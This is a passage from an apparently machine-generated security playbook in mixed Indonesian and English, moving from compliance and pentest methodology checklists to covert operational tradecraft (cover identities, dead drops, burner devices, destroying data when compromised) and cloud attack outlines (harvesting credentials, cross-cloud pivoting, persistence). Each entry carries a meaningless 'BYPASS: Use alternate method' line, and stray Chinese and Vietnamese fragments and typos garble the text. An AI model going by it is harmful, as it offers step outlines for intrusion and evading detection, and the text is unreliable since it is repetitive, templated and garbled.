   ├── Test TLS 1.2+ enforcement untuk data in transit
   ├── Review key management procedures
   ├── Validate encryption pada portable media
   └── Test backup encryption mechanisms
   DETECTION: Encryption monitoring dan key audit
   BYPASS: Use alternate method

4. BACKUP_VALIDATE
   WHAT: Backup and recovery testing untuk PHI systems
   HOW:
   ├── Verify backup encryption dan access controls
   ├── Test backup integrity (restore validation)
   ├── Review backup retention policies (6 tahun minimum)
   ├── Test disaster recovery procedures
   └── Validate offsite backup storage security
   DETECTION: Backup monitoring dan integrity checks
   BYPASS: Use alternate method

5. INCIDENT_RESPONSE
   WHAT: Incident response testing untuk HIPAA breach scenarios
   HOW:
   ├── Test breach notification procedures (60-day window)
   ├── Validate incident documentation processes
   ├── Test containment dan eradication procedures
   ├── Review forensics capability
   └── Simulate breach notification ke HHS
   DETECTION: Incident response plan review
   BYPASS: Use alternate method

6. BAAP_REVIEW
   WHAT: Business Associate Agreement review dan vendor risk assessment
   HOW:
   ├── Inventory all business associates dengan PHI access
   ├── Review BAAP terms dan security requirements
   ├── Assess vendor compliance certifications
   ├── Test vendor access controls dan monitoring
   └── Document vendor risk remediation plan
   DETECTION: Vendor management audit
   BYPASS: Use alternate method

GDPR (6):
1. DATA_MAPPING
   WHAT: Data processing mapping untuk personal data inventory
   HOW:
   ├── Identify all personal data collection points
   ├── Map data flow dari collection ke storage ke deletion
   ├── Document processing purposes dan legal basis
   ├── Identify data processors dan sub-processors
   └── Create Records of Processing Activities (ROPA)
   DETECTION: Data processing audit trail
   BYPASS: Use anonymous data pathway

2. CONSENT_VALIDATE
   WHAT: Consent mechanism validation terhadap GDPR requirements
   HOW:
   ├── Test consent collection mechanisms (opt-in, granular)
   ├── Verify consent withdrawal functionality
   ├── Check consent records dan audit trails
   ├── Test cookie consent management platform
   └── Validate consent for minors (under 16)
   DETECTION: Consent management audit logs
   BYPASS: Use legitimate interest basis

3. RIGHT_TO_ERASURE
   WHAT: Right to erasure testing (Article 17) pada sistem data
   HOW:
   ├── Test data subject erasure request workflow
   ├── Verify complete data removal dari primary systems
   ├── Check backup dan archive deletion procedures
   ├── Validate third-party erasure propagation
   └── Test exception handling (legal hold, freedom of expression)
   DETECTION: Data deletion audit logs
   BYPASS: Use alternate method

4. DATA_PORTABILITY
   WHAT: Data portability testing (Article 20) untuk data export
   HOW:
   ├── Test data export functionality (structured, machine-readable)
   ├── Verify completeness of exported personal data
   ├── Test JSON/CSV export formats
   ├── Validate direct transfer ke other controller
   └── Check export timing dan accessibility
   DETECTION: Data export monitoring
   BYPASS: Use alternate method

5. BREACH_NOTIFICATION
   WHAT: Breach notification testing (Articles 33-34) untuk GDPR compliance
   HOW:
   ├── Test 72-hour notification ke supervisory authority
   ├── Verify data subject notification procedures
   ├── Test breach assessment methodology
   ├── Validate breach documentation process
   └── Simulate cross-border breach notification
   DETECTION: Breach notification log review
   BYPASS: Use alternate method

6. DPIA_REVIEW
   WHAT: Data Protection Impact Assessment review (Article 35)
   HOW:
   ├── Identify high-risk processing activities
   ├── Review DPIA documentation completeness
   ├── Assess necessity dan proportionality measures
   ├── Verify DPO consultation process
   └── Document risk mitigation implementations
   DETECTION: DPIA audit dan review
   BYPASS: Use alternate method

ISO27001 (5):
1. CONTROL_AUDIT
   WHAT: Security control audit terhadap ISO 27001 Annex A controls
   HOW:
   ├── Map organizational controls ke Annex A domains
   ├── Test control effectiveness (preventive, detective, corrective)
   ├── Verify control documentation dan procedures
   ├── Assess control monitoring mechanisms
   └── Document control gaps dan remediation
   DETECTION: Control monitoring dashboard
   BYPASS: Use alternate method

2. RISK_ASSESSMENT
   WHAT: Risk assessment validation terhadap ISO 27001 requirements
   HOW:
   ├── Review risk assessment methodology
   ├── Validate risk register completeness
   ├── Test risk treatment plans
   ├── Verify risk appetite dan acceptance criteria
   └── Review residual risk documentation
   DETECTION: Risk register audit
   BYPASS: Use alternate method

3. POLICY_COMPLIANCE
   WHAT: Policy compliance testing terhadap ISMS requirements
   HOW:
   ├── Inventory all information security policies
   ├── Test policy awareness dan acknowledgment
   ├── Verify policy review cycles (annual minimum)
   ├── Assess policy enforcement mechanisms
   └── Document policy exceptions
   DETECTION: Policy compliance audit
   BYPASS: Use alternate method

4. INCIDENT_MGMT
   WHAT: Incident management testing untuk ISO 27001 compliance
   HOW:
   ├── Test incident classification procedures
   ├── Verify incident response timeline documentation
   ├── Test corrective action implementation
   ├── Validate incident communication procedures
   └── Review post-incident lessons learned
   DETECTION: Incident management audit trail
   BYPASS: Use alternate method

5. BCDR_TESTING
   WHAT: Business continuity testing untuk ISO 27001 BCP/DRP
   HOW:
   ├── Test business impact analysis (BIA) accuracy
   ├── Validate recovery time objectives (RTO/RPO)
   ├── Execute tabletop exercises untuk disaster scenarios
   ├── Test alternate processing site failover
   └── Verify communication tree activation
   DETECTION: BCP/DRP exercise logs
   BYPASS: Use alternate method

FALLBACK:
PCI Scan → HIPAA PHI → GDPR Data → ISO Control →
Access Audit → Encryption Validate → Policy Review → Report
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
PCI DSS scope undefined           │ 1. Auto-discover CDE boundaries
                                  │ 2. Flag scope for manual review
                                  │ 3. Proceed with conservative scope
HIPAA BAAP missing                │ 1. Flag vendor as high-risk
                                  │ 2. Generate non-compliance alert
                                  │ 3. Recommend immediate remediation
GDPR data controller unknown      │ 1. Attempt to identify via data flow
                                  │ 2. Log identification failure
                                  │ 3. Escalate to DPO for resolution
ISO27001 Annex A scope mismatch   │ 1. Map available controls
                                  │ 2. Flag gaps in control coverage
                                  │ 3. Generate partial compliance report
```

---

### 30.17 Methodology Mapping

```
PTES (7):
1. INTELLIGENCE_GATHER
   WHAT: Intelligence gathering menggunakan passive dan active techniques
   HOW:
   ├── OSINT collection (WHOIS, DNS, social media, job postings)
   ├── Identify target infrastructure dan technologies
   ├── Gather employee information dan email addresses
   ├── Map publicly accessible services
   └── Document findings dalam intelligence report
   DETECTION: OSINT monitoring dan brand alerts
   BYPASS: Use alternate method

2. THREAT_MODELING
   WHAT: Threat modeling untuk identifikasi attack vectors
   HOW:
   ├── Identify assets, entry points, dan trust boundaries
   ├── Apply STRIDE/DREAD model untuk threat classification
   ├── Map threat actors terhadap organizational profile
   ├── Prioritize threats berdasarkan likelihood dan impact
   └── Document threat scenarios dalam threat model
   DETECTION: Threat intelligence correlation
   BYPASS: Use alternate method

3. VULNERABILITY_ASSESS
   WHAT: Vulnerability assessment terhadap target systems
   HOW:
   ├── Automated vulnerability scanning (Nessus, Qualys, OpenVAS)
   ├── Manual configuration review
   ├── Web application vulnerability testing
   ├── Network service enumeration dan fingerprinting
   └── Prioritize vulnerabilities berdasarkan exploitability
   DETECTION: Vulnerability scan detection
   BYPASS: Use alternate method

4. EXPLOITATION
   WHAT: Exploitation terhadap identified vulnerabilities
   HOW:
   ├── Develop atau obtain exploit code
   ├── Test exploitation pada staging environment
   ├── Execute exploitation terhadap production systems
   ├── Validate successful compromise
   └── Document exploitation methodology dan results
   DETECTION: Exploit detection (IDS/IPS, EDR)
   BYPASS: Use alternate method

5. POST_EXPLOITATION
   WHAT: Post-exploitation activities setelah successful compromise
   HOW:
   ├── Establish persistent access
   ├── Lateral movement ke additional systems
   ├── Privilege escalation (horizontal dan vertical)
   ├── Data exfiltration planning
   └── Evidence collection dan documentation
   DETECTION: Post-compromise behavioral analysis
   BYPASS: Use alternate method

6. REPORTING
   WHAT: Reporting untuk documentation dan remediation guidance
   HOW:
   ├── Executive summary dengan business impact
   ├── Technical findings dengan reproduction steps
   ├── Risk ratings (CVSS scoring)
   ├── Remediation recommendations dengan priorities
   └── Strategic security improvement roadmap
   DETECTION: Report review process
   BYPASS: Use alternate method

7. REMEDIATION
   WHAT: Remediation verification untuk vulnerability resolution
   HOW:
   ├── Verify remediation implementation
   ├── Test compensating controls
   ├── Re-scan untuk confirmation
   ├── Update risk register
   └── Close remediation tracking tickets
   DETECTION: Remediation verification audit
   BYPASS: Use alternate method

OWASP (10):
1. INJECTION
   WHAT: Injection testing (SQL, NoSQL, OS, LDAP injection)
   HOW:
   ├── Fuzz input fields dengan injection payloads
   ├── Test SQL injection (union, blind, time-based)
   ├── Test command injection via parameter injection
   ├── Test LDAP injection terhadap authentication
   └── Test OS command injection (shell metacharacters)
   DETECTION: Input validation alerts dan WAF logs
   BYPASS: Use alternate method

2. BROKEN_AUTH
   WHAT: Broken authentication testing
   HOW:
   ├── Test credential stuffing resistance
   ├── Verify account lockout mechanisms
   ├── Test session management (token generation, expiry)
   ├── Attempt password brute force
   └── Test multi-factor authentication bypass
   DETECTION: Authentication failure monitoring
   BYPASS: Use alternate method

3. SENSITIVE_DATA
   WHAT: Sensitive data exposure testing
   HOW:
   ├── Scan for sensitive data trong response headers
   ├── Test for verbose error messages
   ├── Check for cached sensitive content
   ├── Verify encryption terhadap sensitive data
   └── Test for sensitive data trong URL parameters
   DETECTION: Data exposure monitoring
   BYPASS: Use alternate method

4. XXE
   WHAT: XML External Entity (XXE) injection testing
   HOW:
   ├── Submit crafted XML payloads ke parser
   ├── Test file disclosure via XXE
   ├── Test SSRF via XXE
   ├── Test denial of service via XXE entity expansion
   └── Test blind XXE via out-of-band data exfiltration
   DETECTION: XML parser monitoring
   BYPASS: Use alternate method

5. BROKEN_ACCESS
   WHAT: Broken access control testing
   HOW:
   ├── Test IDOR (Insecure Direct Object References)
   ├── Verify role-based access control enforcement
   ├── Test horizontal privilege escalation
   ├── Test vertical privilege escalation
   └── Test forced browsing dan directory traversal
   DETECTION: Access control violation alerts
   BYPASS: Use alternate method

6. SECURITY_MISCONFIG
   WHAT: Security misconfiguration testing
   HOW:
   ├── Scan default credentials pada applications
   ├── Check for unnecessary services dan ports
   ├── Review cloud storage permissions (S3, Azure Blob)
   ├── Test for directory listing dan information disclosure
   └── Verify security headers (CSP, X-Frame-Options)
   DETECTION: Configuration baseline monitoring
   BYPASS: Use alternate method

7. XSS
   WHAT: Cross-site scripting testing (reflected, stored, DOM-based)
   HOW:
   ├── Fuzz input fields dengan XSS payloads
   ├── Test reflected XSS via URL parameters
   ├── Test stored XSS via persistent input
   ├── Test DOM-based XSS via client-side code analysis
   └── Verify Content Security Policy implementation
   DETECTION: XSS detection dans.Content-Security-Policy monitoring
   BYPASS: Use alternate method

8. INSECURE_DESERIALIZE
   WHAT: Insecure deserialization testing
   HOW:
   ├── Identify serialization formats (Java, PHP, .NET)
   ├── Tamper serialized objects untuk privilege escalation
   ├── Test remote code execution via deserialization
   ├── Test object injection vulnerabilities
   └── Verify deserialization validation controls
   DETECTION: Deserialization anomaly monitoring
   BYPASS: Use alternate method

9. VULNERABLE_COMP
   WHAT: Vulnerable components testing (SCA - Software Composition Analysis)
   HOW:
   ├── Enumerate application dependencies (npm, pip, maven)
   ├── Check versions against CVE databases
   ├── Identify end-of-life components
   ├── Test for known exploit availability
   └── Prioritize remediation berdasarkan exploitability
   DETECTION: Software composition analysis scanning
   BYPASS: Use alternate method

10. INSUFFICIENT_LOG
    WHAT: Insufficient logging dan monitoring testing
    HOW:
    ├── Verify logging pada authentication events
    ├── Test logging pada authorization failures
    ├── Check centralized log aggregation
    ├── Verify alerting mechanisms untuk suspicious activity
    └── Test log retention compliance
    DETECTION: Logging compliance audit
    BYPASS: Use alternate method

NIST_800_115 (6):
1. PLAN_NETWORK
   WHAT: Network testing planning sesuai NIST SP 800-115
   HOW:
   ├── Define testing scope dan objectives
   ├── Identify target networks dan systems
   ├── Establish rules of engagement
   ├── Document testing methodology
   └── Obtain authorization documentation
   DETECTION: Authorization documentation review
   BYPASS: Use alternate method

2. SCAN_NETWORK
   WHAT: Network scanning untuk host discovery dan port enumeration
   HOW:
   ├── TCP/UDP port scanning (Nmap, Masscan)
   ├── Service version detection
   ├── OS fingerprinting
   ├── Network topology mapping
   └── Identify filtering dan access controls
   DETECTION: Network scanning detection (IDS)
   BYPASS: Use alternate method

3. ENUMERATE_SERVICES
   WHAT: Service enumeration untuk detail information gathering
   HOW:
   ├── Enumerate running services dan versions
   ├── Identify default configurations
   ├── Map service dependencies
   ├── Test for anonymous access
   └── Document service-specific vulnerabilities
   DETECTION: Service enumeration detection
   BYPASS: Use alternate method

4. IDENTIFY_VULN
   WHAT: Vulnerability identification menggunakan manual dan automated techniques
   HOW:
   ├── Automated vulnerability scanning
   ├── Manual vulnerability analysis
   ├── Configuration review
   ├── Verify findings dengan proof-of-concept
   └── Document vulnerability details dan impact
   DETECTION: Vulnerability scanning detection
   BYPASS: Use alternate method

5. EXPLOIT_VULN
   WHAT: Vulnerability exploitation untuk proof-of-concept validation
   HOW:
   ├── Develop atau obtain exploit code
   ├── Test exploitation techniques
   ├── Validate successful exploitation
   ├── Document exploitation steps
   └── Capture evidence (screenshots, logs)
   DETECTION: Exploit detection (EDR, SIEM)
   BYPASS: Use alternate method

6. POST_EXPLOIT
   WHAT: Post-exploitation activities untuk impact assessment
   HOW:
   ├── Assess data access capabilities
   ├── Test lateral movement potential
   ├── Verify persistence mechanisms
   ├── Document business impact
   └── Clean up artifacts
   DETECTION: Post-exploitation behavioral analysis
   BYPASS: Use alternate method

OSSTMM (5):
1. HUMAN_SECTEST
   WHAT: Human security testing (social engineering assessment)
   HOW:
   ├── Design social engineering scenarios
   ├── Execute phishing, vishing, physical pretexting
   ├── Measure human security awareness
   ├── Document successful compromises
   └── Recommend training improvements
   DETECTION: Security awareness monitoring
   BYPASS: Use alternate method

2. PHYSICAL_SECTEST
   WHAT: Physical security testing
   HOW:
   ├── Test physical access controls (badges, locks, guards)
   ├── Attempt tailgating dan piggybacking
   ├── Test surveillance system coverage
   ├── Verify visitor management procedures
   └── Document physical security gaps
   DETECTION: Physical access monitoring
   BYPASS: Use alternate method

3. WIRELESS_SECTEST
   WHAT: Wireless security testing
   HOW:
   ├── Scan for wireless networks (SSID discovery)
   ├── Test wireless encryption (WEP, WPA, WPA2, WPA3)
   ├── Attempt wireless network intrusion
   ├── Test rogue access point detection
   └── Verify wireless network segmentation
   DETECTION: Wireless intrusion detection system (WIDS)
   BYPASS: Use alternate method

4. NETWORK_SECTEST
   WHAT: Network security testing
   HOW:
   ├── Network infrastructure assessment
   ├── Test firewall rules dan segmentation
   ├── Verify network monitoring capabilities
   ├── Test IDS/IPS effectiveness
   └── Document network security posture
   DETECTION: Network security monitoring
   BYPASS: Use alternate method

5. APP_SECTEST
   WHAT: Application security testing
   HOW:
   ├── Web application security assessment
   ├── API security testing
   ├── Mobile application testing (if applicable)
   ├── Source code review (if available)
   └── Document application vulnerabilities
   DETECTION: Application security monitoring
   BYPASS: Use alternate method

FALLBACK:
PTES → OWASP → NIST → OSSTMM → Custom Methodology → Report
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Target blocks automated scanners  │ 1. Switch to manual testing
                                  │ 2. Use slow-rate scanning
                                  │ 3. Pivot to passive reconnaissance
Multiple methodologies required   │ 1. Merge PTES + OWASP frameworks
                                  │ 2. Create composite methodology
                                  │ 3. Prioritize by risk ranking
False positive vulnerability      │ 1. Attempt manual verification
                                  │ 2. Test proof-of-concept
                                  │ 3. Downgrade severity if unconfirmed
```

---

### 30.18 OPSEC Procedures

```
COMMUNICATION (6):
1. ENCRYPTED_COMMS
   WHAT: Encrypted communication menggunakan Signal, Wire, atau Matrix
   HOW:
   ├── Configure end-to-end encrypted messaging platform
   ├── Set disappearing messages (24-72 jam)
   ├── Verify safety numbers dengan out-of-band confirmation
   ├── Disable cloud backup dan notification previews
   └── Rotate communication channels secara periodic
   DETECTION: Encrypted messaging usage analysis
   BYPASS: Use alternate method

2. DEAD_DROP
   WHAT: Dead drop communication untuk asynchronous operational messaging
   HOW:
   ├── Create encrypted file pada shared platform (pastebin, cloud storage)
   ├── Write message dengan agreed encryption layer
   ├── Notify partner menggunakan trigger indicator
   ├── Partner retrieves dan decrypts message
   └── Destroy original file dan access logs
   DETECTION: Unusual file access patterns
   BYPASS: Use alternate method

3. COVERT_CHANNEL
   WHAT: Covert channel communication via DNS atau steganography
   HOW:
   ├── Encode data dalam DNS queries (DNS tunneling)
   ├── Or embed data dalam image files (steganography)
   ├── Or use HTTP header fields untuk data transport
   ├── Transmit via normal-looking traffic
   └── Receiver decodes data dengan shared key
   DETECTION: DNS anomaly analysis, traffic pattern analysis
   BYPASS: Use alternate method

4. CODE_WORDS
   WHAT: Code word system untuk operational communication
   HOW:
   ├── Establish codeword dictionary (targets, actions, status)
   ├── Distribute codeword list secara secure
   ├── Use codewords dalam routine communications
   ├── Rotate codeword sets secara periodic
   └── Maintain separate operational dan personal communications
   DETECTION: Pattern analysis pada communication frequency
   BYPASS: Use alternate method

5. CHECK_IN
   WHAT: Regular check-in schedule untuk operational coordination
   HOW:
   ├── Establish check-in schedule (daily/weekly)
   ├── Define check-in format dan channel
   ├── Document status updates dan task completions
   ├── Verify partner availability
   └── Escalate missed check-ins sesuai protocol
   DETECTION: Communication pattern analysis
   BYPASS: Use alternate method

6. EMERGENCY_BEACON
   WHAT: Emergency beacon protocol untuk urgent operational situations
   HOW:
   ├── Pre-arrange emergency signal mechanism
   ├── Establish emergency communication channel
   ├── Define emergency classification levels
   ├── Test emergency procedures secara regular
   └── Document emergency response procedures
   DETECTION: Unusual communication frequency spike
   BYPASS: Use alternate method

DATA_HANDLING (6):
1. ENCRYPT_DATA
   WHAT: Data encryption at rest menggunakan AES-256 atau ChaCha20
   HOW:
   ├── Encrypt operational data dengan strong algorithm
   ├── Use hardware-backed key storage (TPM, secure enclave)
   ├── Implement key rotation schedule
   ├── Verify encryption strength (key length, entropy)
   └── Test decryption procedures secara regular
   DETECTION: Encryption key usage monitoring
   BYPASS: Use alternate method

2. SECURE_TRANSFER
   WHAT: Secure data transfer menggunakan encrypted channels
   HOW:
   ├── Use SFTP/SCP untuk file transfer
   ├── Or use encrypted archive (GPG, age)
   ├── Verify recipient identity sebelum transfer
   ├── Use VPN atau Tor untuk anonymous transfer
   └── Log transfer audit trail
   DETECTION: Encrypted transfer monitoring
   BYPASS: Use alternate method

3. ACCESS_CONTROL
   WHAT: Data access control untuk operational data protection
   HOW:
   ├── Implement least privilege access model
   ├── Use role-based access controls (RBAC)
   ├── Enable multi-factor authentication
   ├── Monitor access patterns dan anomalies
   └── Review access rights secara periodic
   DETECTION: Access anomaly detection
   BYPASS: Use alternate method

4. AUDIT_TRAIL
   WHAT: Data audit trail untuk operational accountability
   HOW:
   ├── Enable comprehensive audit logging
   ├── Log all data access, modification, dan deletion
   ├── Use tamper-evident logging mechanism
   ├── Monitor audit logs secara regular
   └── Retain audit records sesuai policy
   DETECTION: Audit log integrity monitoring
   BYPASS: Use alternate method

5. SECURE_DELETION
   WHAT: Secure data deletion menggunakan cryptographic erasure
   HOW:
   ├── Overwrite data dengan multiple passes (DoD 5220.22-M)
   ├── Or use cryptographic erasure (destroy encryption key)
   ├── Verify deletion di所有存储介质
   ├── Document deletion procedures
   └── Test deletion verification
   DETECTION: Data deletion monitoring
   BYPASS: Use alternate method

6. CHAIN_OF_CUSTODY
   WHAT: Chain of custody documentation untuk evidence integrity
   HOW:
   ├── Document evidence handling procedures
   ├── Log all evidence transfers
   ├── Maintain physical dan digital custody logs
   ├── Use tamper-evident seals
   └── Verify evidence integrity secara periodic
   DETECTION: Chain of custody audit
   BYPASS: Use alternate method

OPERATIONAL_SECURITY (8):
1. COVER_IDENTITY
   WHAT: Cover identity management untuk operational concealment
   HOW:
   ├── Establish plausible cover identity dengan supporting documentation
   ├── Create digital footprint (social media, email, profiles)
   ├── Maintain separation antara cover dan real identity
   ├── Practice cover identity persona secara regular
   └── Plan cover identity lifecycle (creation, maintenance, retirement)
   DETECTION: Identity verification processes
   BYPASS: Use alternate method

2. DIGITAL_HYGIENE
   WHAT: Digital hygiene practices untuk operational security
   HOW:
   ├── Regular browser history dan cache cleanup
   ├── Use dedicated operational browser profile
   ├── Disable telemetry dan tracking
   ├── Regular system integrity verification
   └── Use privacy-focused OS configurations
   DETECTION: Digital footprint analysis
   BYPASS: Use alternate method

3. PHYSICAL_SECURITY
   WHAT: Physical security measures untuk operational protection
   HOW:
   ├── Assess physical threats terhadap operational sites
   ├── Implement physical access controls
   ├── Use surveillance detection routes (SDR)
   ├── Maintain situational awareness
   └── Plan physical security response procedures
   DETECTION: Physical surveillance detection
   BYPASS: Use alternate method

4. TRAVEL_SECURITY
   WHAT: Travel security protocols untuk operational travel
   HOW:
   ├── Pre-trip threat assessment
   ├── Use travel-dedicated devices
   ├── Implement device search protocols
   ├── Maintain communication check-in schedule
   └── Plan border crossing procedures
   DETECTION: Travel pattern analysis
   BYPASS: Use alternate method

5. DEVICE_SECURITY
   WHAT: Device security menggunakan burner phones, VMs, dan encrypted storage
   HOW:
   ├── Use burner devices untuk operational activities
   ├── Isolate operational activities dalam VMs
   ├── Enable full disk encryption pada所有设备
   ├── Disable unnecessary hardware (camera, mic, GPS)
   └── Plan device disposal procedures
   DETECTION: Device fingerprinting dan IMEI tracking
   BYPASS: Use alternate method

6. NETWORK_ANONYMITY
   WHAT: Network anonymity menggunakan Tor, VPN, dan proxy chains
   HOW:
   ├── Route traffic via Tor network
   ├── Chain multiple VPN providers
   ├── Use proxy chains untuk additional layers
   ├── Monitor network leaks (DNS, WebRTC)
   └── Rotate network identities secara periodic
   DETECTION: Tor exit node monitoring, VPN detection
   BYPASS: Use alternate method

7. EVIDENCE_HANDLING
   WHAT: Evidence handling procedures untuk operational integrity
   HOW:
   ├── Document evidence collection procedures
   ├── Maintain forensic integrity (write blockers)
   ├── Store evidence dalam secure facility
   ├── Log all evidence access
   └── Prepare evidence untuk legal proceedings
   DETECTION: Evidence tampering detection
   BYPASS: Use alternate method

8. EXTRACTION_PLAN
   WHAT: Extraction plan untuk operational withdrawal
   HOW:
   ├── Define extraction triggers dan conditions
   ├── Plan extraction routes dan fallbacks
   ├── Pre-position extraction resources
   ├── Practice extraction procedures
   └── Document extraction success criteria
   DETECTION: Extraction activity monitoring
   BYPASS: Use alternate method

FALLBACK:
Encrypted Comms → Dead Drop → Covert Channel →
Code Words → Check-in → Emergency Beacon → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Encrypted comms platform seized   │ 1. Switch to dead drop communication
                                  │ 2. Activate emergency beacon
                                  │ 3. Assume cover identity
Cover identity compromised        │ 1. Initiate extraction plan
                                  │ 2. Destroy sensitive data
                                  │ 3. Activate alternate identity
Network anonymity failure         │ 1. Disable all network access
                                  │ 2. Switch to physical courier
                                  │ 3. Use pre-arranged fallback channel
```

---

### 30.19 Multi-Cloud Orchestration

```
CROSS_CLOUD (6):
1. AWS_TO_AZURE
   WHAT: Cross-cloud pivot dari AWS ke Azure menggunakan compromised credentials
   HOW:
   ├── Harvest AWS credentials (IAM keys, role assumption)
   ├── Identify Azure-linked accounts atau federated identities
   ├── Assume Azure role atau authenticate sebagai user
   ├── Enumerate Azure resources dan permissions
   └── Establish persistent access ke Azure environment
   DETECTION: Cross-cloud authentication anomaly
   BYPASS: Use alternate method

2. AWS_TO_GCP
   WHAT: Cross-cloud pivot dari AWS ke GCP
   HOW:
   ├── Extract GCP credentials dari AWS systems (environment variables, config)
   ├── Or use compromised GCP service account keys stored trong AWS
   ├── Authenticate ke GCP API
   ├── Enumerate GCP projects dan resources
   └── Establish persistent access ke GCP environment
   DETECTION: Cross-cloud API access monitoring
   BYPASS: Use alternate method

3. AZURE_TO_GCP
   WHAT: Cross-cloud pivot dari Azure ke GCP
   HOW:
   ├── Identify GCP credentials trong Azure Key Vault atau config
   ├── Or use federated identity attributes
   ├── Authenticate ke GCP using extracted credentials
   ├── Map Azure-to-GCP resource relationships
   └── Establish persistent access
   DETECTION: Cross-cloud authentication logging
   BYPASS: Use alternate method

4. HYBRID_ATTACK
   WHAT: Hybrid cloud attack menggunakan on-premise ke cloud pivot
   HOW:
   ├── Compromise on-premise infrastructure
   ├── Identify cloud sync mechanisms (Azure AD Connect, AWS Directory Service)
   ├── Harvest cloud credentials từ hybrid identity
   ├── Pivot ke cloud environment
   └── Establish persistence across both environments
   DETECTION: Hybrid identity authentication monitoring
   BYPASS: Use alternate method

5. MULTI_CLOUD_ENUM
   WHAT: Multi-cloud enumeration untuk asset discovery
   HOW:
   ├── Enumerate AWS (IAM, EC2, S3, Lambda)
   ├── Enumerate Azure (AD, VMs, Storage, Functions)
   ├── Enumerate GCP (IAM, Compute, Storage, Functions)
   ├── Map cross-cloud dependencies
   └── Identify highest-value targets across clouds
   DETECTION: Cross-cloud API activity monitoring
   BYPASS: Use alternate method

6. FEDERATION_ABUSE
   WHAT: Federated identity abuse untuk cross-cloud access
   HOW:
   ├── Identify federation configurations (SAML, OIDC, WS-Federation)
   ├── Manipulate identity assertions
   ├── Perform token relay attacks
   ├── Exploit trust relationships
   └── Maintain access via federation mechanism
   DETECTION: Federation trust anomaly monitoring
   BYPASS: Use alternate method

CLOUD_NATIVE (6):
1. SERVERLESS_ATTACK
   WHAT: Lambda/Functions exploitation untuk code execution
   HOW:
   ├── Identify serverless functions (AWS Lambda, Azure Functions, GCP Cloud Functions)
   ├── Extract source code dan environment variables
   ├── Inject malicious code via deployment package
   ├── Trigger function execution
   └── Use function IAM role untuk further access
   DETECTION: Serverless function invocation monitoring
   BYPASS: Use alternate method

2. CONTAINER_ATTACK
   WHAT: Container service exploitation (ECS, AKS, GKE)
   HOW:
   ├── Access container orchestration API
   ├── Enumerate running containers dan services
   ├── Deploy malicious container dengan host access
   ├── Extract container secrets (env vars, mounted secrets)
   └── Pivot ke underlying infrastructure
   DETECTION: Container runtime monitoring (Falco)
   BYPASS: Use alternate method

3. SERVICE_MESH
   WHAT: Service mesh exploitation (Istio, Linkerd, Consul Connect)
   HOW:
   ├── Access service mesh control plane
   ├── Enumerate service mesh configuration
   ├── Manipulate routing rules
   ├── Intercept service-to-service communication
   └── Extract mTLS certificates
   DETECTION: Service mesh control plane monitoring
   BYPASS: Use alternate method

4. API_GATEWAY_ATTACK
   WHAT: API Gateway exploitation untuk unauthorized API access
   HOW:
   ├── Enumerate API Gateway endpoints dan routes
   ├── Test API key or token bypass
   ├── Manipulate request routing
   ├── Extract backend service credentials
   └── Abuse API rate limiting mechanisms
   DETECTION: API Gateway access logging
   BYPASS: Use alternate method

5. CDN_ATTACK
   WHAT: CDN exploitation untuk content poisoning dan cache manipulation
   HOW:
   ├── Identify CDN provider dan configuration
   ├── Poison cached content via origin manipulation
   ├── Exploit cache key weaknesses
   ├── Inject malicious content into CDN edge nodes
   └── Use CDN misconfiguration untuk origin access
   DETECTION: CDN cache integrity monitoring
   BYPASS: Use alternate method

6. DNS_CLOUD_ATTACK
   WHAT: Cloud DNS exploitation untuk traffic manipulation
   HOW:
   ├── Access cloud DNS management API
   ├── Modify DNS records untuk traffic redirection
   ├── Exploit DNS-based authentication (DKIM, SPF, DMARC)
   ├── Create subdomain delegation untuk persistence
   └── Manipulate DNS-based load balancing
   DETECTION: DNS change monitoring dan alerts
   BYPASS: Use alternate method

FALLBACK:
AWS Pivot → Azure Pivot → GCP Pivot →
Hybrid Attack → Federation Abuse → Multi-Cloud Enum → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Cross-cloud credentials expired   │ 1. Re-authenticate using refresh token
                                  │ 2. Attempt credential rotation
                                  │ 3. Fall back to service account
Cloud API rate limiting           │ 1. Implement exponential backoff
                                  │ 2. Distribute requests across regions
                                  │ 3. Switch to direct API access
Federation trust chain broken     │ 1. Attempt direct authentication
                                  │ 2. Use alternate identity provider
                                  │ 3. Log trust chain failure
```

---

### 30.20 Additional Web Attacks

```
WEB_MISC (10):
1. HOST_HEADER_INJECT
   WHAT: Host header injection untuk cache poisoning dan password reset poisoning
   HOW:
   ├── Send request dengan modified Host header
   ├── Test password reset poisoning via Host header manipulation
   ├── Exploit web cache poisoning via Host-based cache key
   ├── Inject malicious URL trong password reset emails
   └── Test virtual host routing bypass
   DETECTION: Host header validation alerts
   BYPASS: Use alternate method

2. SMS_SMUGGLING
   WHAT: SMS header injection untuk message manipulation
   HOW:
   ├── Identify SMS-sending functionality
   ├── Inject additional headers atau content dalam SMS
   ├── Manipulate sender address atau routing information
   ├── Test for SMS content injection vulnerabilities
   └── Exploit SMS gateway misconfigurations
   DETECTION: SMS gateway logging dan monitoring
   BYPASS: Use alternate method

3. EMAIL_INJECTION
   WHAT: Email header injection untuk email manipulation
   HOW:
   ├── Identify email-sending forms (contact, feedback)
   ├── Inject additional email headers (BCC, CC, Subject)
   ├── Inject additional recipients
   ├── Manipulate email routing headers
   └── Test for email content injection
   DETECTION: Email gateway anomaly detection
   BYPASS: Use alternate method

4. LOG_INJECTION
   WHAT: Log injection (log forging) untuk log manipulation
   HOW:
   ├── Inject log entries via user-controlled input
   ├── Forge log entries untuk misdirection
   ├── Inject newlines untuk log entry splitting
   ├── Exploit log analysis tools (XSS trong log viewers)
   └── Test log integrity mechanisms
   DETECTION: Log integrity monitoring
   BYPASS: Use alternate method

5. HEADER_INJECTION
   WHAT: HTTP header injection untuk response manipulation
   HOW:
   ├── Inject CRLF sequences dalam HTTP headers
   ├── Split HTTP response
   ├── Inject set-cookie headers
   ├── Manipulate caching headers
   └── Test for header injection via redirect parameters
   DETECTION: HTTP response splitting detection
   BYPASS: Use alternate method

6. RESPONSE_SPLITTING
   WHAT: HTTP response splitting untuk cache poisoning dan XSS
   HOW:
   ├── Inject CRLF characters dalam header values
   ├── Split HTTP response ke multiple responses
   ├── Inject malicious content dalam response body
   ├── Poison web caches dengan split responses
   └── Execute XSS via injected response content
   DETECTION: HTTP response integrity monitoring
